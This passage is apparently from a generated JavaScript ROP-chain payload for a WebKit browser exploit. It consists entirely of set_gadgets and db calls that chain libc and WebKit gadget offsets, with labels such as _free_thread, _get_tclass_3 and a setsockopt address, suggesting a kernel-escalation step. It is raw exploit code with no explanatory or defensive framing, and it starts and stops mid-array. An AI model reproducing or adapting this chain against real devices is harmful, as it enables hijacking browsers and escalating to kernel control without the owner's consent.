ropchain+211704,//L3323
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+211736,//L3325
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+211688,//L3322
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+211720,//L3324
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L3322:
db([0,0]);
set_gadget(libc_base+165442,);
//L3323:
db([0,0]);
set_gadget(libc_base+772328,);
//L3324:
db([0,0]);
set_gadget(libc_base+768796,);
//L3325:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+211816,//L3326
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+211832,//L3327
webkit_base+4687784,
libc_base+165442
]);
//L3326:
db([0,0]);
set_gadget(libc_base+768796,);
//L3327:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+211928,//L3329
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+211912,//L3328
webkit_base+4687784,
libc_base+165442
]);
//L3328:
db([0,0]);
set_gadget(libc_base+768796,);
//L3329:
db([0,0]);
//L3313:
set_gadgets([
libc_base+489696,//pop rsp
ropchain+211968,//L3330
//L3277:
libc_base+489696,//pop rsp
ropchain+211984,//L3331
//L3330:
libc_base+489696,//pop rsp
ropchain+206664,//L3205
//L3331:
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+212040,//L3333
webkit_base+4687784,
libc_base+768796
]);
//L3332:
db([1,0]);// 0x1
set_gadget(webkit_base+3789839,);//pop r11
//L3333:
db([0,0]);
set_gadget(libc_base+165442,);
//L3334:
db([1,0]);// 0x1
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+212152,//L3336
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+212136,//L3335
webkit_base+4687784,
libc_base+165442
]);
//L3335:
db([0,0]);
set_gadget(libc_base+768796,);
//L3336:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278,
ropchain+212248,//L3339
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L3337:
db([4294967288,4294967295]);// -0x8
set_gadget(libc_base+772328,);
//L3339:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+212336,//L3341
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+212352,//L3342
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L3341:
db([0,0]);
set_gadget(libc_base+772328,);
//L3342:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+212456,//L3345
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+212440,//L3344
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+165442
]);
//L3344:
db([0,0]);
set_gadget(libc_base+772328,);
//L3345:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+212512,//L3347
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L3347:
db([0,0]);
set_gadgets([
webkit_base+972324,//mov [rax],ecx
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+212616,//L3349
webkit_base+4687784,
libc_base+768796
]);
//L3348:
db([1,0]);// 0x1
set_gadget(webkit_base+3789839,);//pop r11
//L3349:
db([0,0]);
set_gadget(libc_base+165442,);
//L3350:
db([1,0]);// 0x1
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+212728,//L3352
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+212712,//L3351
webkit_base+4687784,
libc_base+165442
]);
//L3351:
db([0,0]);
set_gadget(libc_base+768796,);
//L3352:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278,
ropchain+212824,//L3355
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L3353:
db([4294967288,4294967295]);// -0x8
set_gadget(libc_base+772328,);
//L3355:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+212912,//L3357
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+212928,//L3358
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L3357:
db([0,0]);
set_gadget(libc_base+772328,);
//L3358:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+213032,//L3361
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+213016,//L3360
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+165442
]);
//L3360:
db([0,0]);
set_gadget(libc_base+772328,);
//L3361:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+213104,//L3364
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278
]);
//L3362:
db([8,0]);// 0x8
set_gadget(libc_base+772328,);
//L3364:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+972324,//mov [rax],ecx
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+213240,//L3366
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278,
ropchain+213224,//L3365
webkit_base+4687784,
libc_base+165442
]);
//L3365:
db([0,0]);
set_gadget(libc_base+768796,);
//L3366:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+213344,//L3367
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+213360,//L3368
webkit_base+4687784,
webkit_base+1420514 //pop r8
]);
//L3367:
db([0,0]);
set_gadget(libc_base+768796,);
//L3368:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+213480,//L3369
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+213464,//L3370
webkit_base+4687784,
libc_base+768796
]);
//L3370:
db([0,0]);
set_gadget(libc_base+489696,);//pop rsp
//L3369:
db([0,0]);
//L3309:
set_gadget(libc_base+713278,);
db([208,0]);// 0xd0
set_gadgets([
libc_base+207036,
libc_base+768796,
libc_base+165442,
libc_base+430587,
libc_base+713278
]);
db([4294967280,4294967295]);// -0x10
set_gadgets([
libc_base+207036,
libc_base+768796,
libc_base+713278,
libc_base+430587,
libc_base+207036,
libc_base+768796,
webkit_base+608613,//pop rdx
libc_base+430587,
libc_base+207036,
libc_base+768796,
libc_base+772328,
libc_base+430587,
libc_base+207036,
libc_base+768796,
webkit_base+1420514,//pop r8
libc_base+430587,
libc_base+207036,
libc_base+768796,
webkit_base+17972187,//pop r9
libc_base+430587,
libc_base+207036,
libc_base+768796,
libc_base+765305,
libc_base+430587,
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+768796,
libc_base+11,//nop
libc_base+430587,
libc_base+207036,
libc_base+768796,
libc_base+11,//nop
libc_base+430587,
libc_base+207036,
libc_base+768796,
libc_base+713278,
libc_base+430587,
libc_base+713278
]);
db([4294967280,4294967295]);// -0x10
set_gadgets([
libc_base+207036,
libc_base+768796,
webkit_base+4687784,
libc_base+430587,
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+768796,
libc_base+772328,
libc_base+430587,
libc_base+713278
]);
db([4294967280,4294967295]);// -0x10
set_gadgets([
libc_base+207036,
libc_base+768796,
libc_base+165442,
libc_base+430587,
libc_base+207036,
libc_base+768796,
webkit_base+1420514,//pop r8
libc_base+430587,
libc_base+207036,
libc_base+768796,
libc_base+489696,//pop rsp
libc_base+430587,
libc_base+207036,
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278
]);
db([4294967280,4294967295]);// -0x10
set_gadgets([
libc_base+207036,
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([208,0]);// 0xd0
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278
]);
db([4294967080,4294967295]);// -0xd8
set_gadgets([
libc_base+207036,
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([200,0]);// 0xc8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278
]);
db([4294967088,4294967295]);// -0xd0
set_gadgets([
libc_base+207036,
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([192,0]);// 0xc0
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278
]);
db([4294967096,4294967295]);// -0xc8
set_gadgets([
libc_base+207036,
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([184,0]);// 0xb8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278
]);
db([4294967104,4294967295]);// -0xc0
set_gadgets([
libc_base+207036,
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([176,0]);// 0xb0
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278
]);
db([4294967112,4294967295]);// -0xb8
set_gadgets([
libc_base+207036,
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([168,0]);// 0xa8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278
]);
db([4294967272,4294967295]);// -0x18
set_gadgets([
libc_base+207036,
libc_base+388400,//mov rax,rdi
libc_base+772328
]);
db([4294967280,4294967295]);// -0x10
set_gadgets([
webkit_base+5236215,//and rax,rcx
libc_base+772328,
setsockopt_addr,
webkit_base+2989859,//mov [rax],rcx
libc_base+713278
]);
db([4294967192,4294967295]);// -0x68
set_gadgets([
libc_base+207036,
libc_base+388400,//mov rax,rdi
libc_base+713278
]);
db([48,0]);
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278
]);
db([4294967280,4294967295]);// -0x10
set_gadgets([
libc_base+207036,
libc_base+740138,//mov rax,r8
libc_base+430587,
libc_base+713278
]);
db([32,0]);// 0x20
set_gadgets([
libc_base+207036,
libc_base+388400,//mov rax,rdi
libc_base+713278
]);
db([24,0]);// 0x18
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278
]);
db([128,0]);// 0x80
set_gadgets([
libc_base+207036,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+214808,//L3371
webkit_base+4687784,
libc_base+489696 //pop rsp
]);
//L3371:
db([0,0]);
//_free_thread:
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+214880,//L3373
webkit_base+4687784,
libc_base+740138,//mov rax,r8
webkit_base+1420514 //pop r8
]);
//L3373:
db([0,0]);
set_gadgets([
libc_base+430587,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+214944,//L3375
webkit_base+4687784,
libc_base+740138,//mov rax,r8
webkit_base+1420514 //pop r8
]);
//L3375:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L3376:
db([16,0]);// 0x10
set_gadget(libc_base+772328,);
//L3378:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+215096,//L3380
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+215112,//L3381
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L3380:
db([0,0]);
set_gadget(libc_base+772328,);
//L3381:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+215232,//L3385
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+215216,//L3384
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L3382:
db([4294967288,4294967295]);// -0x8
set_gadget(libc_base+165442,);
//L3384:
db([0,0]);
set_gadget(libc_base+772328,);
//L3385:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+2989859,//mov [rax],rcx
libc_base+713278,
ropchain+215296,//L3388
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L3388:
db([0,0]);
//L3386:
set_gadgets([
libc_base+713278,
ropchain+215360,//L3391
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L3389:
db([4294967288,4294967295]);// -0x8
set_gadget(libc_base+772328,);
//L3391:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+215448,//L3393
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+215464,//L3394
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L3393:
db([0,0]);
set_gadget(libc_base+772328,);
//L3394:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+215544,//L3395
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+215560,//L3396
webkit_base+4687784,
libc_base+165442
]);
//L3395:
db([0,0]);
set_gadget(libc_base+768796,);
//L3396:
db([0,0]);
set_gadgets([
libc_base+149873,//mov eax,[rdi]
libc_base+713278,
ropchain+215720,//L3398
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+215752,//L3400
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+215704,//L3397
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+215736,//L3399
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L3397:
db([0,0]);
set_gadget(libc_base+165442,);
//L3398:
db([0,0]);
set_gadget(libc_base+772328,);
//L3399:
db([0,0]);
set_gadget(libc_base+768796,);
//L3400:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+215832,//L3401
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+215848,//L3402
webkit_base+4687784,
libc_base+165442
]);
//L3401:
db([0,0]);
set_gadget(libc_base+768796,);
//L3402:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+215960,//L3405
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+215944,//L3404
webkit_base+4687784,
libc_base+713278
]);
//L3403:
db([0,0]);
set_gadget(libc_base+165442,);
//L3404:
db([0,0]);
set_gadget(libc_base+768796,);
//L3405:
db([0,0]);
set_gadgets([
webkit_base+11809960,//cmp rax,rsi ;sete al
libc_base+232261,//movzx eax,al
libc_base+713278,
ropchain+216096,//L3407
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+216112,//L3408
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+216080,//L3406
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L3406:
db([0,0]);
set_gadget(libc_base+165442,);
//L3407:
db([0,0]);
set_gadget(libc_base+768796,);
//L3408:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+216256,//L3412
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+216288,//L3414
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+216224,//L3410
webkit_base+4687784,
libc_base+165442
]);
//L3410:
db([0,0]);
set_gadget(libc_base+713278,);
//L3411:
db([0,0]);
set_gadget(webkit_base+3789839,);//pop r11
//L3412:
db([0,0]);
set_gadget(libc_base+772328,);
//L3413:
db([0,0]);
set_gadget(libc_base+768796,);
//L3414:
db([0,0]);
set_gadgets([
webkit_base+11809960,//cmp rax,rsi ;sete al
libc_base+232261,//movzx eax,al
webkit_base+426067,//shl rax,3
libc_base+713278,
ropchain+216400,//L3415+8
libc_base+507828,//add rax,rsi
libc_base+145226,//mov rax,[rax]
libc_base+713278,
ropchain+216392,//L3415
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+489696 //pop rsp
]);
//L3415:
db([0,0]);
set_gadgets([
ropchain+216416,//L3415+24
ropchain+218176,//L3409
libc_base+713278,
ropchain+216472,//L3418
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L3416:
db([4294967288,4294967295]);// -0x8
set_gadget(libc_base+772328,);
//L3418:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+216560,//L3420
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+216576,//L3421
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L3420:
db([0,0]);
set_gadget(libc_base+772328,);
//L3421:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+216720,//L3424
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+216736,//L3425
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+216704,//L3423
webkit_base+4687784,
libc_base+713278
]);
//L3422:
db([16,0]);// 0x10
set_gadget(libc_base+165442,);
//L3423:
db([0,0]);
set_gadget(libc_base+772328,);
//L3424:
db([0,0]);
set_gadget(libc_base+768796,);
//L3425:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+216824,//L3427
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+216840,//L3428
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L3427:
db([0,0]);
set_gadget(libc_base+772328,);
//L3428:
db([0,0]);
set_gadgets([
libc_base+149873,//mov eax,[rdi]
libc_base+713278,
ropchain+217000,//L3430
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+217032,//L3432
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+216984,//L3429
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+217016,//L3431
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L3429:
db([0,0]);
set_gadget(libc_base+165442,);
//L3430:
db([0,0]);
set_gadget(libc_base+772328,);
//L3431:
db([0,0]);
set_gadget(libc_base+768796,);
//L3432:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+217128,//L3434
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+217112,//L3433
webkit_base+4687784,
libc_base+165442
]);
//L3433:
db([0,0]);
set_gadget(libc_base+768796,);
//L3434:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+768796,
//L3436:
ropchain+217232,//L3435
libc_base+713278
]);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+489696,//pop rsp
ropchain+182976,//_get_tclass_3
//L3435:
libc_base+863109,//mov rax,rcx
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+217376,//L3438
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+217392,//L3439
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+217360,//L3437
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L3437:
db([0,0]);
set_gadget(libc_base+165442,);
//L3438:
db([0,0]);
set_gadget(libc_base+768796,);
//L3439:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+217488,//L3441
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+217472,//L3440
webkit_base+4687784,
libc_base+165442
]);
//L3440:
db([0,0]);
set_gadget(libc_base+768796,);
//L3441:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+217584,//L3443
webkit_base+4687784,
libc_base+768796
]);
//L3442:
db([65,0]);// 0x41
set_gadget(webkit_base+3789839,);//pop r11
//L3443:
db([0,0]);
set_gadget(libc_base+165442,);
//L3444:
db([65,0]);// 0x41
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+217728,//L3446
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+217744,//L3447
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+217712,//L3445
webkit_base+4687784,
libc_base+165442
]);
//L3445:
db([0,0]);
set_gadget(libc_base+772328,);
//L3446:
db([0,0]);
set_gadget(libc_base+768796,);
//L3447:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
webkit_base+15055763,//cmp rax,rcx ;sete al
libc_base+350006,//setne al
libc_base+232261,//movzx eax,al
libc_base+713278,
ropchain+217920,//L3449
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+217936,//L3450
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+217904,//L3448
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L3448:
db([0,0]);
set_gadget(libc_base+165442,);
//L3449:
db([0,0]);
set_gadget(libc_base+768796,);
//L3450:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+218080,//L3453
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+218096,//L3454
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+218048,//L3451
webkit_base+4687784,
libc_base+165442
]);
//L3451:
db([0,0]);
set_gadget(libc_base+713278,);
//L3452:
db([0,0]);
set_gadget(libc_base+772328,);
//L3453:
db([0,0]);
set_gadget(libc_base+768796,);
//L3454:
db([0,0]);
set_gadgets([
webkit_base+11809960,//cmp rax,rsi ;sete al
libc_base+350006,//setne al
libc_base+232261,//movzx eax,al
libc_base+713278,
ropchain+218168,//L3456
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L3456:
db([0,0]);
//L3409:
set_gadgets([
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+218296,//L3458
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+218312,//L3459
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+218280,//L3457
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L3457:
db([0,0]);
set_gadget(libc_base+165442,);
//L3458:
db([0,0]);
set_gadget(libc_base+768796,);
//L3459:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+218440,//L3462
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+218472,//L3464
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+218456,//L3463
webkit_base+4687784,
libc_base+713278
]);
//L3461:
db([0,0]);
set_gadget(webkit_base+3789839,);//pop r11
//L3462:
db([0,0]);
set_gadget(libc_base+165442,);
//L3463:
db([0,0]);
set_gadget(libc_base+768796,);
//L3464:
db([0,0]);
set_gadgets([
webkit_base+11809960,//cmp rax,rsi ;sete al
libc_base+232261,//movzx eax,al
webkit_base+426067,//shl rax,3
libc_base+713278,
ropchain+218584,//L3465+8
libc_base+507828,//add rax,rsi
libc_base+145226,//mov rax,[rax]
libc_base+713278,
ropchain+218576,//L3465
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+489696 //pop rsp
]);
//L3465:
db([0,0]);
set_gadgets([
ropchain+218600,//L3465+24
ropchain+220728,//L3460
libc_base+768796
]);
//L3466:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+768796
]);
//L3467:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+768796
]);
//L3468:
db([25,0]);// 0x19
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+768796
]);
//L3469:
db([41,0]);// 0x29
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278,
ropchain+218848,//L3472
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L3470:
db([4294967288,4294967295]);// -0x8
set_gadget(libc_base+772328,);
//L3472:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+218936,//L3474
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+218952,//L3475
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L3474:
db([0,0]);
set_gadget(libc_base+772328,);
//L3475:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+219096,//L3478
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+219112,//L3479
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+219080,//L3477
webkit_base+4687784,
libc_base+713278
]);
//L3476:
db([16,0]);// 0x10
set_gadget(libc_base+165442,);
//L3477:
db([0,0]);
set_gadget(libc_base+772328,);
//L3478:
db([0,0]);
set_gadget(libc_base+768796,);
//L3479:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+219200,//L3481
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+219216,//L3482
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L3481:
db([0,0]);
set_gadget(libc_base+772328,);
//L3482:
db([0,0]);
set_gadgets([
libc_base+149873,//mov eax,[rdi]
libc_base+713278,
ropchain+219376,//L3484
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+219408,//L3486
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+219360,//L3483
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+219392,//L3485
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L3483:
db([0,0]);
set_gadget(libc_base+165442,);
//L3484:
db([0,0]);
set_gadget(libc_base+772328,);
//L3485:
db([0,0]);
set_gadget(libc_base+768796,);
//L3486:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+219504,//L3488
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+219488,//L3487
webkit_base+4687784,
libc_base+165442
]);
//L3487:
db([0,0]);
set_gadget(libc_base+768796,);
//L3488:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+768796,
//L3490:
ropchain+219608,//L3489
libc_base+713278
]);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+489696,//pop rsp
ropchain+223592,//L3491
//L3489:
libc_base+863109,//mov rax,rcx
libc_base+713278
]);
db([4294967256,4294967295]);// -0x28
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+219752,//L3493
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+219768,//L3494
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+219736,//L3492
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L3492:
db([0,0]);
set_gadget(libc_base+165442,);
//L3493:
db([0,0]);
set_gadget(libc_base+768796,);
//L3494:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+219896,//L3497
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+219928,//L3499
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+219912,//L3498
webkit_base+4687784,
libc_base+713278
]);
//L3496:
db([0,0]);
set_gadget(webkit_base+3789839,);//pop r11
//L3497:
db([0,0]);
set_gadget(libc_base+165442,);
//L3498:
db([0,0]);
set_gadget(libc_base+768796,);
//L3499:
db([0,0]);
set_gadgets([
webkit_base+11809960,//cmp rax,rsi ;sete al
libc_base+232261,//movzx eax,al
webkit_base+426067,//shl rax,3
libc_base+713278,
ropchain+220040,//L3500+8
libc_base+507828,//add rax,rsi
libc_base+145226,//mov rax,[rax]
libc_base+713278,
ropchain+220032,//L3500
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+489696 //pop rsp
]);
//L3500:
db([0,0]);
set_gadgets([
ropchain+220056,//L3500+24
